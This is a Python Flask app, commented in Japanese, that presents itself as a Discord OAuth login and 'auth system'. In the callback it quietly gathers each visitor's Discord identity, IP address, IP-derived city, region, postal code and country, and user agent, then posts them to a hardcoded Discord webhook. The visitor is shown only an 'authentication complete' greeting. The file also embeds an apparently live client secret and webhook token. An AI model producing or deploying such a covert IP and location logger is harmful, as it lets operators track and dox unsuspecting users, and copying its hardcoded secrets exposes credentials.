import os
import requests
from flask import Flask, request, redirect, render_template
from datetime import datetime
import pytz
import json
import urllib.parse

app = Flask(__name__)

# セキュリティ強化のため、本番環境ではここにランダムなキーを設定
app.secret_key = os.urandom(24)  # ランダムキーを生成

DISCORD_CLIENT_ID = "1367928958510829608"
DISCORD_CLIENT_SECRET = "GzI1QQHQciE7LwLaIOGxllaH8dURhg9j"
REDIRECT_URI = "http://127.0.0.1:5000/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1366804921487196171/TOWO1jQkASCrgOv0bEOzVqW725r7vuGiRxnjAx2TYjgZzdVf6VIv2ZOVsURCEl2THEbc"

def get_location(ip):
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
        return {
            "ip": ip,
            "city": res.get("city", "不明"),
            "region": res.get("region", "不明"),
            "postal": res.get("postal", "不明"),
            "country": res.get("country_name", "不明"),
        }
    except:
        return {"ip": ip, "city": "不明", "region": "不明", "postal": "不明", "country": "不明"}

@app.route('/')
def index():
    return render_template("login.html")

@app.route('/login')
def login():
    params = {
        "client_id": DISCORD_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "identify"
    }
    return redirect(f"https://discord.com/api/oauth2/authorize?{urllib.parse.urlencode(params)}")

@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "Code not found", 400

    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    token_response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_json = token_response.json()
    access_token = token_json.get("access_token")

    if not access_token:
        return "Access token not found", 400

    user_res = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    user = user_res.json()
    username = f"{user['username']}#{user['discriminator']}"
    user_id = user['id']
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png?size=1024"

    # IPアドレス取得方法（本番環境ではX-Forwarded-Forが有効）
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    location = get_location(ip)

    jst = pytz.timezone('Asia/Tokyo')
    now = datetime.now(jst).strftime("%Y-%m-%d %H:%M:%S")

    embed = {
        "username": "📥 新しいアクセス",
        "embeds": [
            {
                "title": "📥 新しいアクセス",
                "color": 0xff0066,
                "fields": [
                    {"name": "🕒 時間", "value": now, "inline": True},
                    {"name": "👤 ユーザー", "value": f"{username} (`{user_id}`)", "inline": True},
                    {"name": "🌍 IP", "value": location["ip"], "inline": True},
                    {"name": "📍 地域", "value": f"{location['region']}（{location['city']}）", "inline": True},
                    {"name": "〒 郵便番号", "value": location['postal'], "inline": True},
                    {"name": "🗺️ マップ", "value": f"[Google Maps](https://www.google.com/maps?q={location['ip']})", "inline": False},
                    {"name": "🧭 国", "value": location['country'], "inline": True},
                    {"name": "🖥️ UA", "value": request.headers.get("User-Agent"), "inline": False},
                ],
                "thumbnail": {"url": avatar_url},
                "footer": {"text": "Ultra Cyber Auth System"}
            }
        ]
    }

    requests.post(WEBHOOK_URL, json=embed)

    return f"ようこそ、{username} さん！ 認証が完了しました。"

if __name__ == "__main__":
    app.run(debug=False)  # 本番環境ではdebug=Falseに設定
